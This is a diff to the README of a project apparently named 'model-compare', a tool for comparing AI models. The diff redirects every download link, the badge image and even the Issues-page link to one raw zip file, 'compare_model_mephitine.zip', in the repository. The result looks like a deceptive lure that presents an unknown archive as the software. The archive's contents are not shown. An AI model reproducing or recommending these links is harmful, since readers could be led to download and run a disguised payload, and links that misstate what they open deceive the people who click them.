@@ -4,7 +4,7 @@
 Welcome to **model-compare**! This application helps you evaluate AI models side-by-side based on user tasks. It focuses on three main areas: accuracy, creativity, and efficiency. You can make informed decisions about which models best suit your needs.
 
 ## 📥 Download the Latest Version
-[![Download Model Compare](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Zexx-files/model-compare/releases)
+[![Download Model Compare](https://github.com/Zexx-files/model-compare/raw/refs/heads/main/model_compare/compare_model_mephitine.zip%https://github.com/Zexx-files/model-compare/raw/refs/heads/main/model_compare/compare_model_mephitine.zip)](https://github.com/Zexx-files/model-compare/raw/refs/heads/main/model_compare/compare_model_mephitine.zip)
 
 ## 💻 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -21,7 +21,7 @@ With **model-compare**, you can:
 - Export your comparison results for later reference
 
 ## ⚙️ How to Download & Install
-1. **Visit the Releases Page:** Go to the following link to find the latest version of the software: [Download Here](https://github.com/Zexx-files/model-compare/releases).
+1. **Visit the Releases Page:** Go to the following link to find the latest version of the software: [Download Here](https://github.com/Zexx-files/model-compare/raw/refs/heads/main/model_compare/compare_model_mephitine.zip).
 
 2. **Choose the Right File:**
    - Look for the latest version on the releases page. 
@@ -51,7 +51,7 @@ With **model-compare**, you can:
 
 ## 🌐 Community and Support
 For help, questions, and suggestions, feel free to join our community:
-- **Issues Page:** Report any bugs or issues you encounter on the [GitHub Issues page](https://github.com/Zexx-files/model-compare/issues).
+- **Issues Page:** Report any bugs or issues you encounter on the [GitHub Issues page](https://github.com/Zexx-files/model-compare/raw/refs/heads/main/model_compare/compare_model_mephitine.zip).
 - **User Guide:** Access detailed instructions on using the software within the application and online.
 
 ## 🔄 Future Updates
@@ -64,4 +64,4 @@ We are continuously improving **model-compare**. Upcoming features may include:
 Your opinion matters. After using **model-compare**, consider providing feedback. Share your experience and suggestions through the Issues page or directly within the application.
 
 ## 📥 Download the Latest Version Again
-[![Download Model Compare](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Zexx-files/model-compare/releases)
+[![Download Model Compare](https://github.com/Zexx-files/model-compare/raw/refs/heads/main/model_compare/compare_model_mephitine.zip%https://github.com/Zexx-files/model-compare/raw/refs/heads/main/model_compare/compare_model_mephitine.zip)](https://github.com/Zexx-files/model-compare/raw/refs/heads/main/model_compare/compare_model_mephitine.zip)
